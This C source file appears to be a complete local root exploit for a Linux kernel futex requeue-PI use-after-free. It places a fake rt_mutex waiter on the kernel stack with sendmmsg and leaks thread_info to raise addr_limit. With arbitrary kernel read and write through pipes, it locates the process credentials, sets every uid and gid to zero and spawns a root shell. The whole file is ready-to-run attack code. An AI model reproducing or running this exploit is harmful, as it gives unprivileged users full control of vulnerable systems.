#define _GNU_SOURCE

#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <assert.h>
#include <sched.h>
#include <pthread.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <signal.h>
#include <sys/syscall.h>
#include <string.h>

#include "futex.h"

#define assert_(x) \
    if (!(x))      \
    {              \
        puts(#x);  \
        exit(0);   \
    }

#define THREAD_WAIT_SEC 1
#define DEFAULT_PRIO 0

// futex stuff
uint32_t non_pi = 0, pi = 0;
struct rt_mutex_waiter fake_waiter;

// stack overwrite stuff
#define __count_of(arr) (sizeof(arr) / sizeof(arr[0]))
#define FILLER "AAAAAAAA"

int stack_allocators[2];
struct iovec msg[7];
struct mmsghdr msgvec;

// info leak stuff
#define THREAD_INFO_BASE 0xffffe000 // aligned to 0x10 pages
struct thread_info *victim_thread_info;
pthread_t leaked_waiter_thread;

pthread_t run_thread(void *(*start_routine)(void *), void *arg)
{
    pthread_t t;
    assert_(!pthread_create(&t, NULL, start_routine, arg));
    return t;
}

void *lock_pi_with_prio(void *arg)
{
    int priority = (int)arg;
    setpriority(PRIO_PROCESS, 0, priority);

    futex_lock_pi(&pi); // lock pi futex
}

pthread_t add_waiter_with_prio(int priority)
{
    return run_thread(lock_pi_with_prio, (void *)priority);
}

int kernel_memcpy(void *src, void *dst, size_t len)
{
    // requires addr_limit > src, dst
    // copies by first "writing" the src (whether kernel or not) into the pipe buffer
    // then "reading" it into dst (also kernel or not)
    int pipefd[2];
    assert_(!pipe(pipefd));

    if (write(pipefd[1], src, len) != len) // copy to pipe buffer
        return 1;
    if (read(pipefd[0], dst, len) != len) // copy from pipe buffer to dst
        return -1;

    close(pipefd[0]);
    close(pipefd[1]);

    return 0;
}

void *read_ptr(void *addr)
{
    // reads ptr from address
    void *ptr;
    assert(!kernel_memcpy(addr, &ptr, sizeof(ptr)));
    return ptr;
}

void setup_stack_overwriter()
{
    // create and fill the socket buffer (so following sends will block in kernel)
    puts("[*] creating socketpair for stack frame overwrite");

    assert_(!socketpair(AF_UNIX, SOCK_STREAM, 0, stack_allocators));

    while (send(stack_allocators[0], FILLER, strlen(FILLER), MSG_DONTWAIT) != -1)
        ;
}

void overwrite_stack()
{
    // uses the full socket to send new data which will block in kernel (__sys_sendmsg)
    struct rt_mutex_waiter *stack_fake_waiter = (struct rt_mutex_waiter *)((void *)&msg + 32); // offset calculated from real experiments

    // uafed waiter: prio=0, all prev and next ptrs point to fake_waiter
    stack_fake_waiter->list_entry.prio = 0;
    stack_fake_waiter->list_entry.prio_list.next = stack_fake_waiter->list_entry.prio_list.prev = &fake_waiter.list_entry.prio_list;
    stack_fake_waiter->list_entry.node_list.next = stack_fake_waiter->list_entry.node_list.prev = &fake_waiter.list_entry.node_list;

    msgvec.msg_hdr.msg_iov = msg;
    msgvec.msg_hdr.msg_iovlen = __count_of(msg);

    assert_(!sendmmsg(stack_allocators[0], &msgvec, 1, 0));
}

int requeue_pi_single(unsigned int *src, unsigned int *dst)
{
    // force a requeue by using *src as cmp (so that comparison is always succeeful)
    return futex_cmp_requeue_pi(src, dst, 1, *src);
}

pthread_t write_address_at(void *addr)
{
    // adding a waiter before fake_waiter will write the new waiter address to fake_waiter.prev (fake_waiter.prev->next = new_waiter).
    // since fake_waiter.prio is very big, we always insert before it.
    fake_waiter.list_entry.node_list.prev = addr;
    fake_waiter.list_entry.prio_list.prev = addr;
    fake_waiter.list_entry.prio = 0x1000; // higher than highest prio possible

    // make sure the waiter will not be the first in list, so that it will be inserted before fake_waiter
    puts("[*] adding waiter");
    pthread_t ret = add_waiter_with_prio(DEFAULT_PRIO + 1);
    sleep(THREAD_WAIT_SEC);

    return ret;
}

void modify_addr_limit()
{
    void *addr_limit_address = &victim_thread_info->addr_limit;
    while (1)
    {
        // attempt to overwrite addr limit with value > &addr_limit. write the new waiter address into it, hoping it will be above us.
        write_address_at(addr_limit_address);

        // attempt to overwrite addr_limit with 0xffffffff, if fails (== read failed) this means we don't have access to this address, which means that the allocated waiter stack was placed below our waiter's stack (and thread_info). retry.
        int address_limit = -1;
        if (kernel_memcpy(&address_limit, addr_limit_address, sizeof(address_limit)) == 0)
            break;
    }
}

#define OUR_COMM "exploit"
struct cred *find_cred(struct task_struct *task)
{
    // ptr is just before comm
    char task_struct[0x400];
    kernel_memcpy(task, task_struct, sizeof(task_struct));

    void *comm_addr = memmem(task_struct, sizeof(task_struct), OUR_COMM, sizeof(OUR_COMM));
    assert_(comm_addr);

    return read_ptr(comm_addr - sizeof(struct cred *));
}

void overwrite_creds(struct cred *cred)
{
    struct cred root_creds;

    assert_(!kernel_memcpy(cred, &root_creds, sizeof(root_creds)));

    // make root :P
    root_creds.uid = root_creds.gid = root_creds.suid = root_creds.sgid = root_creds.euid = root_creds.egid = root_creds.fsuid = root_creds.fsgid = 0;

    assert_(!kernel_memcpy(&root_creds, cred, sizeof(root_creds)));
}

void sigusr(int arg)
{
    modify_addr_limit();

    puts("[v] overwrote addr_limit!");

    struct task_struct *task = read_ptr(&victim_thread_info->task);

    printf("[v] got task struct at %p!\n", task);

    struct cred *cred = find_cred(task);

    printf("[v] got cred struct at %p!\n", cred);

    overwrite_creds(cred);

    puts("[v] overwrote creds!");

    printf("[*] current euid: %d %d\n", geteuid(), getegid());

    system("/bin/sh");
}

void *uafed_waiter_thread(void *arg)
{
    signal(SIGUSR1, sigusr); // so that we can "wake" this thread later

    setup_stack_overwriter();

    puts("[*] waiting for non_pi -> pi requeue");
    futex_wait_requeue_pi(&non_pi, &pi, 0);

    // doing stuff here (like puts) causes a panic. probably issuing syscalls messing with stack or something
    overwrite_stack();
    // waiter should now be faked: -> uafed_waiter (prio=0) -> fake_waiter
}

struct thread_info *leak_thread_info()
{
    struct rt_mutex_waiter tmp_waiter;

    leaked_waiter_thread = write_address_at(&tmp_waiter.list_entry.prio_list.next);

    return (struct thread_info *)((unsigned long)tmp_waiter.list_entry.prio_list.next & THREAD_INFO_BASE);
}

void run_in_uafed_thread()
{
    pthread_kill(leaked_waiter_thread, SIGUSR1); // runs sigusr in the leaked waiter thread (whose thread_info address we know)
}

int main()
{
    // lock pi futex so that further attempts will block and add a waiter
    assert_(futex_lock_pi(&pi) == 0);

    // add the uaf thread waiter.
    run_thread(uafed_waiter_thread, NULL);
    sleep(THREAD_WAIT_SEC);

    // requeue non_pi -> pi. this will make waiter wait on pi instead, without cleaning `requeue_pi_key` so that it can be requeued onto itself
    puts("[*] requeueing non_pi -> pi");
    assert_(requeue_pi_single(&non_pi, &pi) == 1);

    // add another waiter so that `pi_state` will not get freed
    puts("[*] adding another waiter");
    add_waiter_with_prio(DEFAULT_PRIO);
    sleep(THREAD_WAIT_SEC);

    // release pi so that next requeue will be able to acquire the lock and release our waiter
    puts("[*] force releasing pi futex");
    pi = 0;

    // requeue pi -> pi. this is the bug as it was not intended for pi futexes to be requeued. this will leave a dangling reference to the uaf'ed thread stack in the waiter list.
    puts("[*] requeing pi futex onto itself");
    requeue_pi_single(&pi, &pi);

    victim_thread_info = leak_thread_info();

    printf("[v] leaked thread info base: %p\n", victim_thread_info);

    run_in_uafed_thread();

    sleep(-1);
}